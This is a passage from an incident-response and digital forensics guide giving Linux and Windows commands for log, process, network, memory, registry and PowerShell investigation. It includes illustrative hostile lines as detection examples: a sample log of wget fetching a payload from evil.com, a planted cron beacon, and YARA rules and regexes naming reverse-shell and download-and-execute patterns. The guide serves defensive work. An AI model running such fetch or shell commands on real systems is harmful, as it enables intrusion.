# Jan 15 */5 * * * root /tmp/.hidden/beacon.sh  <-- SUSPICIOUS

# --- Using journalctl for systemd systems ---
# View logs for a specific time range
journalctl --since "2024-01-15 03:00:00" --until "2024-01-15 06:00:00"

# View logs for a specific service
journalctl -u sshd --since "2024-01-15" --no-pager

# View kernel messages
journalctl -k --since "2024-01-15 03:00:00"

# Export logs in JSON format for SIEM ingestion
journalctl --since "2024-01-15" -o json > /evidence/journal_export.json

# --- Check for package installation/removal ---
# Debian/Ubuntu
grep " install " /var/log/dpkg.log
grep " remove " /var/log/dpkg.log

# RHEL/CentOS
grep "Installed\|Erased" /var/log/yum.log
grep "Installed\|Removed" /var/log/dnf.log
```

#### Audit Log Parsing: Finding Anomalies

```bash [auditd-analysis.sh]
# ===== AUDITD LOG ANALYSIS =====
# Auditd provides detailed system call logging

# --- Search for file access events ---
ausearch -f /etc/shadow --start recent
ausearch -f /etc/passwd --start "01/15/2024" "03:00:00"

# --- Search for command execution by specific user ---
ausearch -ua 1001 --start "01/15/2024" -i

# --- Search for failed system calls (exploitation attempts) ---
ausearch --success no --start "01/15/2024"

# --- Generate audit report ---
aureport --summary --start "01/15/2024" --end "01/16/2024"

# --- Authentication report ---
aureport -au --start "01/15/2024" --end "01/16/2024"

# --- File access report ---
aureport -f --start "01/15/2024" --end "01/16/2024"

# --- Anomaly report ---
aureport --anomaly --start "01/15/2024"

# --- Search for execve calls (command execution) ---
ausearch -sc execve --start "01/15/2024" -i | head -100

# Example output:
# type=EXECVE msg=audit(01/15/2024 04:25:33.001:1234) : argc=3 a0="wget"
#   a1="http://evil.com/payload.sh" a2="-O" a3="/tmp/payload.sh"
```

---

### 2. Process Hunting: Finding Rogue Applications

#### Memory Sleuth: Process Analysis Techniques

```bash [process-investigation.sh]
# ===== LIVE PROCESS INVESTIGATION =====

# --- List all running processes with full details ---
ps auxf
# Flags: a=all users, u=user-oriented format, x=processes without TTY, f=forest/tree view

# --- Look for suspicious processes ---
# Processes running from /tmp, /dev/shm, or hidden directories
ps aux | awk '$11 ~ /\/tmp\/|\/dev\/shm\/|\.\// {print}'

# Processes with no associated binary (deleted executable)
ls -la /proc/*/exe 2>/dev/null | grep "(deleted)"

# Example output:
# lrwxrwxrwx 1 root root 0 Jan 15 04:30 /proc/6789/exe -> /tmp/cryptominer (deleted)

# --- Process with high CPU (cryptominers) ---
ps aux --sort=-%cpu | head -10

# --- Process with high memory usage ---
ps aux --sort=-%mem | head -10

# --- Check process start time (recently started processes) ---
ps -eo pid,lstart,cmd --sort=-start_time | head -20

# --- Get full command line of suspicious process ---
cat /proc/<PID>/cmdline | tr '\0' ' ' ; echo
cat /proc/<PID>/environ | tr '\0' '\n'  # Environment variables

# --- Check what files a process has open ---
ls -la /proc/<PID>/fd/
cat /proc/<PID>/maps  # Memory mappings
cat /proc/<PID>/status  # Process status details
```

#### Network Connection Forensics: lsof & netstat Deep Dive

```bash [network-investigation.sh]
# ===== NETWORK CONNECTION ANALYSIS =====

# --- List all network connections with process info ---
ss -tlnp  # TCP listening
ss -ulnp  # UDP listening
ss -tnp   # Established TCP connections

# --- Using netstat (if available) ---
netstat -tlnp   # TCP listening with PID
netstat -anp    # All connections with PID

# --- Using lsof for detailed network analysis ---
# All network connections
lsof -i -n -P

# Connections to specific IP
lsof -i @203.0.113.50

# Connections on specific port
lsof -i :4444   # Common reverse shell port
lsof -i :8080   # Common C2 port

# --- Find processes making outbound connections ---
ss -tnp state established | awk '{print $4, $5}' | sort | uniq -c | sort -rn

# Example output (beaconing pattern):
#  450 10.0.1.100:random  203.0.113.50:443
#  223 10.0.1.100:random  198.51.100.25:8080

# --- Check for raw sockets (potential sniffing) ---
ss -w -p
lsof -i -n -P | grep RAW

# --- DNS queries (potential data exfiltration) ---
# Check for unusual DNS traffic
tcpdump -i any -n port 53 -c 100 2>/dev/null | \
  awk '/A\?/ {print $NF}' | sort | uniq -c | sort -rn

# --- Check for connections on non-standard ports ---
ss -tnp | awk '$4 !~ /:22$|:80$|:443$|:25$|:53$/ {print}'
```

#### Hidden Process Detection: Uncovering Stealth

```bash [hidden-process-detection.sh]
# ===== DETECTING HIDDEN PROCESSES =====

# --- Compare /proc entries against ps output ---
# Get PIDs from /proc
ls -d /proc/[0-9]* | sed 's/\/proc\///' | sort -n > /tmp/proc_pids.txt

# Get PIDs from ps
ps -e -o pid= | tr -d ' ' | sort -n > /tmp/ps_pids.txt

# Find hidden processes (in /proc but not in ps output)
diff /tmp/proc_pids.txt /tmp/ps_pids.txt

# --- Check for kernel-level rootkits ---
# Compare loaded modules against known baseline
lsmod > /tmp/current_modules.txt
diff /tmp/baseline_modules.txt /tmp/current_modules.txt

# Check for suspicious kernel modules
lsmod | grep -v "^Module" | awk '{print $1}' | while read mod; do
  modinfo "$mod" 2>/dev/null | grep -q "filename" || echo "SUSPICIOUS: $mod (no file info)"
done

# --- Check for LD_PRELOAD hijacking ---
cat /etc/ld.so.preload 2>/dev/null
env | grep LD_PRELOAD
for proc_dir in /proc/[0-9]*; do
  preload=$(cat "$proc_dir/environ" 2>/dev/null | tr '\0' '\n' | grep LD_PRELOAD)
  if [ -n "$preload" ]; then
    pid=$(basename "$proc_dir")
    echo "PID $pid has LD_PRELOAD: $preload"
  fi
done
```

---

### 3. Baseline Verification: File Integrity Monitoring

```bash [file-integrity.sh]
# ===== AIDE (Advanced Intrusion Detection Environment) =====

# --- Initialize AIDE database (on clean system) ---
sudo aide --init
sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# --- Run integrity check ---
sudo aide --check

# Example output:
# AIDE found differences between database and filesystem!!
#
# Changed files:
# changed: /usr/bin/ssh
# changed: /usr/sbin/sshd
# changed: /etc/shadow
#
# Added files:
# added: /usr/local/bin/.hidden_binary
# added: /tmp/.malware

# --- Detailed check with specific output ---
sudo aide --check --report=stdout

# ===== TRIPWIRE =====

# --- Initialize Tripwire ---
sudo tripwire --init

# --- Run integrity check ---
sudo tripwire --check

# --- Update database after verified changes ---
sudo tripwire --update --twrfile /var/lib/tripwire/report/latest.twr

# ===== MANUAL FILE INTEGRITY CHECKS =====

# --- Check important binaries against package manager ---
# Debian/Ubuntu - Verify installed package files
dpkg --verify
# Output shows files that have been modified:
# ??5?????? c /etc/ssh/sshd_config    (config file, expected)
# ??5??????   /usr/bin/ssh             (UNEXPECTED - binary modified!)

# RHEL/CentOS - Verify RPM packages
rpm -Va
# Output format: SM5DLUGT c <filename>
# S=size, M=mode, 5=md5, D=device, L=links, U=user, G=group, T=time

# --- Check for recently modified system binaries ---
find /usr/bin /usr/sbin /bin /sbin -mtime -7 -type f -ls

# --- Verify binary against known hash ---
sha256sum /usr/bin/ssh
# Compare against: https://packages.ubuntu.com or rpm database
```

---

### 4. Rootkit Hunting: Deep System Scan

```bash [malware-detection.sh]
# ===== ClamAV - Signature-Based Detection =====

# --- Update virus definitions ---
sudo freshclam

# --- Full system scan ---
sudo clamscan -r --infected --log=/var/log/clamav/scan_$(date +%Y%m%d).log /

# --- Scan specific directories ---
sudo clamscan -r --infected /tmp /var/tmp /dev/shm /home

# --- Scan with removal (use with caution - after imaging!) ---
sudo clamscan -r --infected --remove /tmp

# ===== rkhunter - Rootkit Detection =====

# --- Update rkhunter database ---
sudo rkhunter --update
sudo rkhunter --propupd  # Update file properties database

# --- Run full check ---
sudo rkhunter --check --skip-keypress --report-warnings-only

# Key checks performed:
# - Known rootkit signatures
# - File property changes
# - Hidden files and directories
# - Suspicious kernel modules
# - Network interfaces in promiscuous mode
# - System command binaries

# --- Review rkhunter log ---
grep "Warning" /var/log/rkhunter.log

# Example output:
# [04:30:15] Warning: The command '/usr/bin/curl' has been replaced by a script
# [04:30:16] Warning: Hidden directory found: /dev/.hiddenstuff
# [04:30:17] Warning: Process '6789' is running but not visible to ps

# ===== chkrootkit =====

# --- Run chkrootkit ---
sudo chkrootkit

# --- Run in expert mode (more verbose) ---
sudo chkrootkit -x

# Key checks:
# - Known rootkit signatures in binaries
# - Signs of LKM (Loadable Kernel Module) rootkits
# - Network interface promiscuous mode
# - wtmp/utmp/lastlog deletions
# - Suspicious strings in system commands

# ===== YARA Rules - Custom Malware Detection =====

# --- Install YARA ---
sudo apt install yara -y

# --- Create custom YARA rule ---
cat << 'EOF' > /tmp/suspicious_rules.yar
rule Reverse_Shell {
    meta:
        description = "Detects common reverse shell patterns"
    strings:
        $s1 = "/bin/sh -i" ascii
        $s2 = "/bin/bash -i" ascii
        $s3 = "socket.socket" ascii
        $s4 = "subprocess.call" ascii
        $s5 = "os.dup2" ascii
        $s6 = "/dev/tcp/" ascii
    condition:
        any of them
}

rule Crypto_Miner {
    meta:
        description = "Detects cryptocurrency mining indicators"
    strings:
        $s1 = "stratum+tcp://" ascii
        $s2 = "xmrig" ascii nocase
        $s3 = "monero" ascii nocase
        $s4 = "cryptonight" ascii nocase
        $s5 = "hashrate" ascii nocase
    condition:
        2 of them
}
EOF

# --- Scan with YARA rules ---
yara -r /tmp/suspicious_rules.yar /tmp /var/tmp /dev/shm /home
```

---

### 5. Account Forensics: User Activity Analysis

```bash [user-investigation.sh]
# ===== USER ACCOUNT INVESTIGATION =====

# --- List all user accounts ---
cat /etc/passwd | awk -F: '{print $1, $3, $6, $7}'

# --- Find accounts with UID 0 (root equivalents) ---
awk -F: '$3 == 0 {print $1}' /etc/passwd
# Should only show "root" - anything else is suspicious

# --- Find accounts with login shells ---
grep -v "/nologin\|/false\|/sync\|/shutdown\|/halt" /etc/passwd

# --- Find recently created accounts ---
# Check for accounts created in the last 7 days
awk -F: '{print $1}' /etc/passwd | while read user; do
  created=$(stat -c %W /home/"$user" 2>/dev/null)
  if [ "$created" != "0" ] && [ -n "$created" ]; then
    created_date=$(date -d @"$created" '+%Y-%m-%d %H:%M:%S' 2>/dev/null)
    echo "$user - Home created: $created_date"
  fi
done

# --- Check sudo access ---
cat /etc/sudoers
cat /etc/sudoers.d/*
grep -Po '^sudo.+:\K.*$' /etc/group

# --- Check for accounts with no password ---
awk -F: '($2 == "" || $2 == "!" || $2 == "*") {print $1, $2}' /etc/shadow

# --- Review login history ---
last -a -F  # All logins with full timestamps and hostnames
lastb -a -F  # Failed login attempts
lastlog  # Last login for each user

# --- Check for active sessions ---
w       # Who is logged in and what they're doing
who -a  # All logged in users with details

# --- Check user's command history ---
for user_dir in /home/*; do
  username=$(basename "$user_dir")
  echo "=== History for: $username ==="
  cat "$user_dir/.bash_history" 2>/dev/null | tail -50
  cat "$user_dir/.python_history" 2>/dev/null | tail -20
  cat "$user_dir/.mysql_history" 2>/dev/null | tail -20
done

# Also check root
cat /root/.bash_history | tail -50

# --- Check for SSH key persistence ---
for user_dir in /home/* /root; do
  if [ -d "$user_dir/.ssh" ]; then
    echo "=== SSH directory for: $(basename $user_dir) ==="
    ls -la "$user_dir/.ssh/"
    echo "--- authorized_keys ---"
    cat "$user_dir/.ssh/authorized_keys" 2>/dev/null
    echo "--- known_hosts ---"
    wc -l "$user_dir/.ssh/known_hosts" 2>/dev/null
  fi
done
```

---

### 6. Secure Shell Forensics: SSH Log Deep Dive

```bash [ssh-investigation.sh]
# ===== SSH CONNECTION ANALYSIS =====

# --- Accepted SSH connections with key fingerprints ---
grep "Accepted" /var/log/auth.log | awk '{print $1,$2,$3,$9,$11,$14,$16}'

# --- SSH sessions with duration ---
grep "session opened\|session closed" /var/log/auth.log | grep "sshd"

# --- Port forwarding attempts (tunneling) ---
grep "forwarding" /var/log/auth.log
# Example: Jan 15 04:30:00 server sshd[12345]: Local forwarding port 8080

# --- Check SSH configuration for backdoors ---
grep -n "AuthorizedKeysFile\|PermitRootLogin\|PasswordAuthentication\|AllowUsers\|Port" /etc/ssh/sshd_config

# --- Check for SSH tunnels currently active ---
ps aux | grep "ssh.*-[LRD]"
ss -tnp | grep ssh

# ===== SERVICE LOG ANALYSIS =====

# --- Apache/Nginx access logs (web shell detection) ---
# Look for command execution patterns in URLs
grep -E "(cmd=|exec=|system\(|passthru|shell_exec|eval\(|base64_decode)" /var/log/apache2/access.log
grep -E "(\.php\?|\.asp\?|\.jsp\?).*=" /var/log/nginx/access.log | \
  awk '{print $1, $4, $7}' | sort | uniq -c | sort -rn | head -20

# --- Look for unusual HTTP methods ---
awk '$6 ~ /PUT|DELETE|CONNECT|TRACE/ {print}' /var/log/apache2/access.log

# --- MySQL/MariaDB logs ---
grep -i "error\|warning\|denied" /var/log/mysql/error.log

# --- Check for web shells by file content ---
find /var/www -name "*.php" -exec grep -l "eval\|base64_decode\|system\|passthru\|shell_exec" {} \;
find /var/www -name "*.php" -newer /var/www/index.php -ls
```

---

### 7. RAM Forensics: Volatile Data Investigation

```bash [memory-analysis.sh]
# ===== MEMORY ACQUISITION =====

# --- Using LiME (Linux Memory Extractor) ---
# Install LiME kernel module
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src && make

# Capture memory to file
sudo insmod lime-$(uname -r).ko "path=/evidence/memory_dump.lime format=lime"

# Capture memory to network (avoids writing to compromised disk)
sudo insmod lime-$(uname -r).ko "path=tcp:4444 format=lime"
# On forensic workstation: nc <target-ip> 4444 > memory_dump.lime

# --- Using /proc/kcore (less reliable but no module needed) ---
sudo dd if=/proc/kcore of=/evidence/kcore_dump bs=1M

# --- Using AVML (Microsoft's Acquire Volatile Memory for Linux) ---
sudo ./avml /evidence/memory_dump.lime

# ===== MEMORY ANALYSIS WITH VOLATILITY 3 =====

# --- Identify the OS profile ---
vol -f /evidence/memory_dump.lime banners.Banners

# --- List all processes ---
vol -f /evidence/memory_dump.lime linux.pslist.PsList

# --- List processes in tree format ---
vol -f /evidence/memory_dump.lime linux.pstree.PsTree

# --- Check for hidden processes ---
vol -f /evidence/memory_dump.lime linux.pslist.PsList --pid-filter hidden

# --- List open files per process ---
vol -f /evidence/memory_dump.lime linux.lsof.Lsof

# --- Extract process memory ---
vol -f /evidence/memory_dump.lime linux.proc.Maps --pid 6789 --dump

# --- Check network connections ---
vol -f /evidence/memory_dump.lime linux.sockstat.Sockstat

# --- List loaded kernel modules ---
vol -f /evidence/memory_dump.lime linux.lsmod.Lsmod

# --- Check for rootkit hooks ---
vol -f /evidence/memory_dump.lime linux.check_syscall.Check_syscall

# --- Extract bash history from memory ---
vol -f /evidence/memory_dump.lime linux.bash.Bash

# --- Check for injected code ---
vol -f /evidence/memory_dump.lime linux.malfind.Malfind
```

---

### 8. Chronological Reconstruction: Incident Timeline

```bash [timeline-creation.sh]
# ===== CREATING A FORENSIC TIMELINE =====

# --- Using log2timeline (plaso) ---
# Create a timeline from disk image
log2timeline.py /evidence/timeline.plaso /evidence/disk_image.dd

# Create timeline from live system (mount read-only first)
sudo mount -o ro,noexec,nosuid /dev/sdb1 /mnt/evidence
log2timeline.py /evidence/timeline.plaso /mnt/evidence

# Filter and output timeline
psort.py -o l2tcsv /evidence/timeline.plaso \
  "date > '2024-01-14 00:00:00' AND date < '2024-01-17 00:00:00'" \
  -w /evidence/filtered_timeline.csv

# --- Manual timeline from filesystem ---
# Create body file using find
find /mnt/evidence -xdev -printf "%T@ %Tc %p\n" 2>/dev/null | \
  sort -n > /evidence/filesystem_timeline.txt

# --- Combine log sources ---
# Merge auth.log, syslog, and application logs into timeline
cat << 'SCRIPT' > /tmp/merge_logs.sh
#!/bin/bash
echo "Timestamp,Source,Event" > /evidence/merged_timeline.csv

# Auth log events
awk '{
  timestamp=$1" "$2" "$3;
  source="auth.log";
  event=$0;
  gsub(/,/, ";", event);
  print timestamp","source","event
}' /var/log/auth.log >> /evidence/merged_timeline.csv

# Syslog events
awk '{
  timestamp=$1" "$2" "$3;
  source="syslog";
  event=$0;
  gsub(/,/, ";", event);
  print timestamp","source","event
}' /var/log/syslog >> /evidence/merged_timeline.csv

# Sort by timestamp
sort -t',' -k1 /evidence/merged_timeline.csv > /evidence/sorted_timeline.csv
SCRIPT
chmod +x /tmp/merge_logs.sh
```

---

### 9. Forensic Imaging: Capturing the Crime Scene

```bash [evidence-preservation.sh]
# ===== FORENSIC DISK IMAGING =====

# --- Create forensic image using dd ---
# Always use a write-blocker when possible
sudo dd if=/dev/sda of=/evidence/disk_image.dd bs=4M status=progress conv=noerror,sync

# --- Create forensic image using dc3dd (preferred) ---
sudo dc3dd if=/dev/sda of=/evidence/disk_image.dd hash=sha256 log=/evidence/imaging.log

# --- Create forensic image using ewfacquire (E01 format) ---
sudo ewfacquire /dev/sda \
  -t /evidence/disk_image \
  -C "IR-2024-0042" \
  -D "Server compromised system disk" \
  -e "Analyst Name" \
  -E "IR-2024-0042" \
  -f encase6 \
  -c deflate:best

# ===== HASH VERIFICATION =====

# --- Generate hash of original disk ---
sudo sha256sum /dev/sda > /evidence/original_disk_hash.txt

# --- Verify forensic image matches original ---
sha256sum /evidence/disk_image.dd > /evidence/image_hash.txt
diff /evidence/original_disk_hash.txt /evidence/image_hash.txt

# ===== VOLATILE DATA COLLECTION =====
# Collect volatile data BEFORE imaging (order of volatility)

cat << 'SCRIPT' > /tmp/collect_volatile.sh
#!/bin/bash
EVIDENCE_DIR="/evidence/volatile_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

echo "=== Collection started: $(date -u) ===" > "$EVIDENCE_DIR/collection.log"

# 1. System time
date -u > "$EVIDENCE_DIR/system_time.txt"
echo "System time collected" >> "$EVIDENCE_DIR/collection.log"

# 2. Network connections
ss -tlnp > "$EVIDENCE_DIR/listening_tcp.txt"
ss -tnp > "$EVIDENCE_DIR/established_tcp.txt"
ss -ulnp > "$EVIDENCE_DIR/listening_udp.txt"
echo "Network connections collected" >> "$EVIDENCE_DIR/collection.log"

# 3. Running processes
ps auxf > "$EVIDENCE_DIR/processes.txt"
ps -eo pid,ppid,user,args --sort=-pcpu > "$EVIDENCE_DIR/processes_by_cpu.txt"
echo "Processes collected" >> "$EVIDENCE_DIR/collection.log"

# 4. Open files
lsof -n -P > "$EVIDENCE_DIR/open_files.txt"
echo "Open files collected" >> "$EVIDENCE_DIR/collection.log"

# 5. Network routing
ip route > "$EVIDENCE_DIR/routes.txt"
ip addr > "$EVIDENCE_DIR/interfaces.txt"
arp -a > "$EVIDENCE_DIR/arp_cache.txt"
echo "Network config collected" >> "$EVIDENCE_DIR/collection.log"

# 6. Loaded kernel modules
lsmod > "$EVIDENCE_DIR/kernel_modules.txt"
echo "Kernel modules collected" >> "$EVIDENCE_DIR/collection.log"

# 7. Mounted filesystems
mount > "$EVIDENCE_DIR/mounted_filesystems.txt"
df -h > "$EVIDENCE_DIR/disk_usage.txt"
echo "Filesystem info collected" >> "$EVIDENCE_DIR/collection.log"

# 8. Logged in users
w > "$EVIDENCE_DIR/logged_in_users.txt"
last -a -F > "$EVIDENCE_DIR/login_history.txt"
echo "User info collected" >> "$EVIDENCE_DIR/collection.log"

# 9. Scheduled tasks
for user in $(cut -d: -f1 /etc/passwd); do
  crontab -l -u "$user" 2>/dev/null > "$EVIDENCE_DIR/crontab_${user}.txt"
done
cat /etc/crontab > "$EVIDENCE_DIR/system_crontab.txt"
ls -la /etc/cron.d/ > "$EVIDENCE_DIR/cron_d_listing.txt"
echo "Scheduled tasks collected" >> "$EVIDENCE_DIR/collection.log"

# 10. System information
uname -a > "$EVIDENCE_DIR/system_info.txt"
cat /etc/os-release >> "$EVIDENCE_DIR/system_info.txt"
uptime >> "$EVIDENCE_DIR/system_info.txt"
echo "System info collected" >> "$EVIDENCE_DIR/collection.log"

# Hash all collected files
sha256sum "$EVIDENCE_DIR"/* > "$EVIDENCE_DIR/evidence_hashes.txt"

echo "=== Collection completed: $(date -u) ===" >> "$EVIDENCE_DIR/collection.log"
SCRIPT
chmod +x /tmp/collect_volatile.sh
sudo /tmp/collect_volatile.sh
```

::tip
**Evidence Handling Best Practice:** Always follow the **order of volatility** when collecting evidence:
1. CPU registers and cache
2. RAM (memory dump)
3. Network connections and state
4. Running processes
5. Disk contents
6. Remote logging and monitoring data
7. Physical configuration and network topology
8. Archival media (backups, printouts)
::

---

## Windows Forensics: IR on Microsoft Systems

::note
This section covers Windows-specific incident response procedures using both built-in tools and third-party forensic utilities. All commands include expected outputs and analysis guidance.
::

---

### 1. EVTX Forensics: Windows Log Investigation

#### Security Log Deep Dive: Event ID Analysis

```powershell [windows-event-log-analysis.ps1]
# ===== CRITICAL SECURITY EVENT IDS =====
#
# 4624  - Successful logon
# 4625  - Failed logon
# 4634  - Logoff
# 4648  - Logon using explicit credentials (RunAs)
# 4672  - Special privileges assigned (admin logon)
# 4688  - New process created
# 4689  - Process terminated
# 4697  - Service installed
# 4698  - Scheduled task created
# 4699  - Scheduled task deleted
# 4700  - Scheduled task enabled
# 4720  - User account created
# 4722  - User account enabled
# 4724  - Password reset attempt
# 4728  - Member added to security-enabled global group
# 4732  - Member added to security-enabled local group
# 4738  - User account changed
# 4756  - Member added to universal security group
# 4776  - NTLM authentication (credential validation)
# 1102  - Audit log cleared (CRITICAL - anti-forensics!)

# --- Check for cleared event logs (anti-forensics indicator) ---
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=1102} -ErrorAction SilentlyContinue |
  Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[1].Value}} |
  Format-Table -AutoSize

# --- Failed logon attempts (brute force detection) ---
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddDays(-7)} |
  Select-Object TimeCreated,
    @{Name="TargetUser";Expression={$_.Properties[5].Value}},
    @{Name="SourceIP";Expression={$_.Properties[19].Value}},
    @{Name="LogonType";Expression={$_.Properties[10].Value}},
    @{Name="FailReason";Expression={$_.Properties[8].Value}} |
  Format-Table -AutoSize

# Logon Type Reference:
# 2  = Interactive (console)
# 3  = Network (SMB, mapped drives)
# 4  = Batch (scheduled task)
# 5  = Service
# 7  = Unlock
# 8  = NetworkCleartext
# 9  = NewCredentials (RunAs /netonly)
# 10 = RemoteInteractive (RDP)
# 11 = CachedInteractive

# --- Successful logons (look for unusual patterns) ---
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624; StartTime=(Get-Date).AddDays(-7)} |
  Where-Object { $_.Properties[8].Value -in @(2,3,10) } |
  Select-Object TimeCreated,
    @{Name="TargetUser";Expression={$_.Properties[5].Value}},
    @{Name="SourceIP";Expression={$_.Properties[18].Value}},
    @{Name="LogonType";Expression={$_.Properties[8].Value}},
    @{Name="LogonProcess";Expression={$_.Properties[9].Value}} |
  Format-Table -AutoSize

# --- New user accounts created ---
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4720} -ErrorAction SilentlyContinue |
  Select-Object TimeCreated,
    @{Name="NewUser";Expression={$_.Properties[0].Value}},
    @{Name="CreatedBy";Expression={$_.Properties[4].Value}} |
  Format-Table -AutoSize

# --- Services installed (persistence) ---
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4697} -ErrorAction SilentlyContinue |
  Select-Object TimeCreated,
    @{Name="ServiceName";Expression={$_.Properties[4].Value}},
    @{Name="ServiceFile";Expression={$_.Properties[5].Value}},
    @{Name="InstalledBy";Expression={$_.Properties[0].Value}} |
  Format-Table -AutoSize

# --- Process creation with command line ---
# Requires: Advanced Audit Policy - Audit Process Creation + Include command line
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688; StartTime=(Get-Date).AddDays(-1)} |
  Select-Object TimeCreated,
    @{Name="User";Expression={$_.Properties[1].Value}},
    @{Name="Process";Expression={$_.Properties[5].Value}},
    @{Name="CommandLine";Expression={$_.Properties[8].Value}},
    @{Name="ParentProcess";Expression={$_.Properties[13].Value}} |
  Where-Object { $_.CommandLine -match "powershell|cmd|wscript|cscript|mshta|certutil|bitsadmin" } |
  Format-Table -AutoSize
```

#### Application & System Log Analysis

```powershell [app-system-log-analysis.ps1]
# --- Application crashes (exploitation indicators) ---
Get-WinEvent -FilterHashtable @{LogName='Application'; Level=2; StartTime=(Get-Date).AddDays(-7)} |
  Select-Object TimeCreated, ProviderName, Message |
  Where-Object { $_.Message -match "fault|crash|exception|violation" } |
  Format-List

# --- System errors ---
Get-WinEvent -FilterHashtable @{LogName='System'; Level=2; StartTime=(Get-Date).AddDays(-7)} |
  Select-Object TimeCreated, ProviderName, Id, Message |
  Format-Table -AutoSize -Wrap

# --- Windows Firewall log events ---
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Firewall With Advanced Security/Firewall'; StartTime=(Get-Date).AddDays(-7)} -ErrorAction SilentlyContinue |
  Select-Object TimeCreated, Id, Message |
  Format-Table -AutoSize

# ===== USING CHAINSAW FOR RAPID LOG ANALYSIS =====
# Chainsaw is an excellent tool for rapid Windows event log triage

# --- Hunt for suspicious activity using Sigma rules ---
# chainsaw.exe hunt <EVTX_DIR> -s <SIGMA_RULES_DIR> --mapping <MAPPING_FILE>
# chainsaw.exe hunt C:\Windows\System32\winevt\Logs\ -s sigma/rules/ --mapping mappings/sigma-event-logs-all.yml

# --- Search for specific event patterns ---
# chainsaw.exe search "mimikatz" -e C:\Windows\System32\winevt\Logs\
# chainsaw.exe search "powershell" -e C:\Windows\System32\winevt\Logs\ --timestamp "2024-01-15T00:00:00"
```

---

### 2. Script Sleuth: PowerShell History Analysis

```powershell [powershell-investigation.ps1]
# ===== POWERSHELL HISTORY AND LOGGING =====

# --- Check PowerShell console history file ---
# Default location for each user
$historyPaths = Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

foreach ($path in $historyPaths) {
    $username = $path.FullName.Split('\')[2]
    Write-Host "`n=== PowerShell History for: $username ===" -ForegroundColor Yellow
    Get-Content $path | Select-Object -Last 100
}

# --- Check PowerShell Script Block Logging (Event ID 4104) ---
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104; StartTime=(Get-Date).AddDays(-7)} |
  Select-Object TimeCreated,
    @{Name="ScriptBlock";Expression={$_.Properties[2].Value}} |
  Where-Object { $_.ScriptBlock -match "Invoke-Expression|IEX|DownloadString|DownloadFile|EncodedCommand|FromBase64String|Invoke-WebRequest|Net.WebClient|Start-Process|Invoke-Mimikatz|Invoke-Shellcode" } |
  Format-List

# --- Check for encoded PowerShell commands ---
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} -ErrorAction SilentlyContinue |
  Where-Object { $_.Message -match "-enc|-EncodedCommand|FromBase64String" } |
  Select-Object TimeCreated, Message |
  Format-List

# --- Decode Base64 encoded commands found in logs ---
function Decode-Base64Command {
    param([string]$EncodedCommand)
    try {
        $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedCommand))
        return $decoded
    } catch {
        return "Failed to decode: $EncodedCommand"
    }
}

# Example usage:
# Decode-Base64Command "SQBuAHYAbwBrAGUALQBFAHhAcAByAGUAcwBzAGkAbwBuAA=="

# --- PowerShell Module Logging (Event ID 4103) ---
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4103; StartTime=(Get-Date).AddDays(-7)} -ErrorAction SilentlyContinue |
  Select-Object TimeCreated, Message |
  Where-Object { $_.Message -match "Net.WebClient|Invoke-|Download" } |
  Format-List

# --- Check PowerShell profile for persistence ---
$profiles = @(
    "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1",
    "$env:USERPROFILE\Documents\PowerShell\Microsoft.PowerShell_profile.ps1",
    "C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1",
    "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
)

foreach ($profile in $profiles) {
    if (Test-Path $profile) {
        Write-Host "`n=== Profile found: $profile ===" -ForegroundColor Red
        Get-Content $profile
    }
}
```

---

### 3. Registry Forensics: Windows Configuration Artifacts

```powershell [registry-investigation.ps1]
# ===== REGISTRY PERSISTENCE ANALYSIS =====

# --- Common Run Key Persistence ---
$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
)

foreach ($key in $runKeys) {
    if (Test-Path $key) {
        Write-Host "`n=== $key ===" -ForegroundColor Yellow
        Get-ItemProperty $key | Format-List
    }
}

# --- Service-based Persistence ---
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*" -ErrorAction SilentlyContinue |
  Where-Object { $_.ImagePath -and $_.ImagePath -notmatch "system32|SysWOW64|Windows" } |
  Select-Object PSChildName, ImagePath, Start, ObjectName |
  Format-Table -AutoSize -Wrap

# --- Shell Extensions / COM Objects ---
Get-ItemProperty "HKLM:\SOFTWARE\Classes\CLSID\*\InprocServer32" -ErrorAction SilentlyContinue |
  Where-Object { $_.'(default)' -and $_.'(default)' -notmatch "system32|SysWOW64|Program Files" } |
  Select-Object PSParentPath, '(default)' |
  Format-Table -AutoSize -Wrap

# --- Winlogon Persistence ---
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" |
  Select-Object Shell, Userinit, Taskman |
  Format-List
# Expected: Shell=explorer.exe, Userinit=C:\Windows\system32\userinit.exe,

# --- Image File Execution Options (Debugger persistence) ---
